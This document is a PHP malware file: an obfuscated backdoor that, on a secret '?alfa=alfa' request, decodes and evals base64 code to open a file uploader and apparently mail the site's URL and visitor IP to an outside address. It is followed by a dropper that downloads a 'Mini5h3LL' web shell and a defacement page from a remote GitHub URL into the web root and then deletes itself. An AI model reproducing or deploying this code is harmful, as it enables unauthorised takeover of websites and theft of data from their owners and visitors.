<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="alfa"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAgZWNobyAiPHRpdGxlPlByaXZhdGUtVXBsb2FkZXI8L3RpdGxlPlxuPGJvZHkgYmdjb2xvcj0jMDAwMDAwPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIndoaXRlXCI+PGI+WW91ciBJcCBBZGRyZXNzIGlzPC9iPiA8Zm9udCBjb2xvcj1cIndoaXRlXCI+PC9mb250PjwvY2VudGVyPlxuPGJpZz48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48Y2VudGVyPlxuIjtlY2hvICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2VjaG8gIjwvY2VudGVyPjwvZm9udD48L2E+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+XG48YnI+XG48YnI+XG48Y2VudGVyPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPjxiaWc+U29sZXZpc2libGUgVXBsb2FkIEFyZWE8L2JpZz48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPjwvZm9udD48L2NlbnRlcj48YnI+XG48Y2VudGVyPjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScgbmFtZT0ndXBsb2FkZXInPiI7ZWNobyAnPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIHNpemU9IjQ1Ij48aW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPjwvY2VudGVyPic7aWYoaXNzZXQoJF9QT1NUWydfdXBsJ10pJiYkX1BPU1RbJ191cGwnXT09ICJVcGxvYWQiKXtpZihAbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7ZWNobyAnPGI+PGZvbnQgY29sb3I9IiM3Q0ZDMDAiPjxjZW50ZXI+VXBsb2FkIFN1Y2Nlc3NmdWxseSA7KTwvZm9udD48L2E+PGZvbnQgY29sb3I9IiM3Q0ZDMDAiPjwvYj48YnI+PGJyPic7fWVsc2V7ZWNobyAnPGI+PGZvbnQgY29sb3I9IiM3Q0ZDMDAiPjxjZW50ZXI+VXBsb2FkIGZhaWxlZCA6KDwvZm9udD48L2E+PGZvbnQgY29sb3I9IiM3Q0ZDMDAiPjwvYj48YnI+PGJyPic7fX1lY2hvICc8Y2VudGVyPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MzBweDsgYmFja2dyb3VuZDogdXJsKCZxdW90O2h0dHA6Ly9zb2xldmlzaWJsZS5jb20vaW1hZ2VzL2JnX2VmZmVjdF91cC5naWYmcXVvdDspIHJlcGVhdC14IHNjcm9sbCAwJSAwJSB0cmFuc3BhcmVudDsgY29sb3I6IHJlZDsgdGV4dC1zaGFkb3c6IDhweCA4cHggMTNweDsiPjxzdHJvbmc+PGI+PGJpZz5LYWxpeC1YYWxpazwvYj48L2JpZz48L3N0cm9uZz48L3NwYW4+PC9jZW50ZXI+JzsKZXZhbChiYXNlNjRfZGVjb2RlKCdKSFIxYW5WaGJtMWhhV3dnUFNBbmEyRnNhWGd3ZUdGc2FXdEFaMjFoYVd3dVkyOXRKenNLSkhoZmNHRjBhQ0E5SUNKb2RIUndPaTh2SWlBdUlDUmZVMFZTVmtWU1d5ZFRSVkpXUlZKZlRrRk5SU2RkSUM0Z0pGOVRSVkpXUlZKYkoxSkZVVlZGVTFSZlZWSkpKMTA3Q2lSd1pYTmhibDloYkdWeWRDQTlJQ0ptYVhnZ0pIaGZjR0YwYUNBNmNDQXFTVkFnUVdSa2NtVnpjeUE2SUZzZ0lpQXVJQ1JmVTBWU1ZrVlNXeWRTUlUxUFZFVmZRVVJFVWlkZElDNGdJaUJkSWpzS2JXRnBiQ2drZEhWcWRXRnViV0ZwYkN3Z0lrTnZiblJoWTNRZ1RXVWlMQ0FrY0dWellXNWZZV3hsY25Rc0lDSmJJQ0lnTGlBa1gxTkZVbFpGVWxzblVrVk5UMVJGWDBGRVJGSW5YU0F1SUNJZ1hTSXBPdz09JykpPz4=");exit;}/*** ?alfa=alfa ***/?>
?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/kalix.php" ;
$text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/mini.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."Kalix-Xalik Mini5h3LL";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/xalik.htm" ;
$text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/vuln.htm');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."Vuln!! patch it Now!";
}else 
  echo "not exits";
echo "done .\n " ;

@unlink(__FILE__);
?>
